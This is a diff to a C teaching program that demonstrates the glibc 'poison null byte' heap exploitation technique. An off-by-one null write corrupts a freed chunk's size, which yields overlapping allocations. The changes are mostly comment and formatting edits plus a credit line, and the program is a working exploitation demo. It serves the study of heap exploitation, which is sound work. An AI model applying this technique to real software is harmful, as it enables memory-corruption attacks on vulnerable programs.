@@ -8,7 +8,7 @@ int main()
 {
 	printf("Welcome to poison null byte 2.0!\n");
 	printf("Tested in Ubuntu 14.04 64bit.\n");
-	printf("This technique can be used when you have an off-by-one in a malloc'ed region with a null byte.\n");
+	printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n");
 
 	uint8_t* a;
 	uint8_t* b;
@@ -19,41 +19,50 @@ int main()
 
 	printf("We allocate 0x100 bytes for 'a'.\n");
 	a = (uint8_t*) malloc(0x100);
-	printf("a: %p\n",a);
+	printf("a: %p\n", a);
 	int real_a_size = malloc_usable_size(a);
-	printf("Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): %#x\n",real_a_size);
+	printf("Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): %#x\n", real_a_size);
 
-	b = (uint8_t*) malloc(0x200); //least significant byte cannot be 0
-	printf("b: %p\n",b);
+    /* chunk size attribute cannot have a least significant byte with a value of 0x00.
+     * the least significant byte of this will be 0x10, because the size of the chunk includes
+     * the amount requested plus some amount required for the metadata. */
+	b = (uint8_t*) malloc(0x200);
+
+	printf("b: %p\n", b);
+
 	c = (uint8_t*) malloc(0x100);
-	printf("c: %p\n",c);
+	printf("c: %p\n", c);
 
 	uint64_t* b_size_ptr = (uint64_t*)(b - 8);
 
+    /* this technique works by overwriting the size metadata of a free chunk */
 	free(b);
 	
-	printf("b.size: %#lx\n",*b_size_ptr);
+	printf("b.size: %#lx\n", *b_size_ptr);
 	printf("b.size is: (0x200 + 0x10) | prev_in_use\n");
-	printf("We overflow 'a' with a single null byte.\n");
+	printf("We overflow 'a' with a single null byte into the metadata of 'b'\n");
 	a[real_a_size] = 0; 
-	printf("b.size: %#lx\n",*b_size_ptr);
+	printf("b.size: %#lx\n", *b_size_ptr);
 
 	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
-	printf("c.size is %#lx\n",*c_prev_size_ptr);
+	printf("c.prev_size is %#lx\n",*c_prev_size_ptr);
 	b1 = malloc(0x100);
+
 	printf("b1: %p\n",b1);
 	printf("Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: %lx\n",*c_prev_size_ptr);
 	printf("Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
 	printf("We malloc 'b2', our 'victim' chunk.\n");
+
 	b2 = malloc(0x80);
 	printf("b2: %p\n",b2);
 
-	printf("Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");
-	free(b1);
-	free(c);
-
 	memset(b2,'B',0x80);
 	printf("Current b2 content:\n%s\n",b2);
+
+	printf("Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n");
+
+	free(b1);
+	free(c);
 	
 	printf("Finally, we allocate 'd', overlapping 'b2'.\n");
 	d = malloc(0x300);
@@ -63,6 +72,6 @@ int main()
 	memset(d,'D',0x300);
 
 	printf("New b2 content:\n%s\n",b2);
+
+    printf("Thanks to http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf for the clear explanation of this technique.\n");
 }
-
-
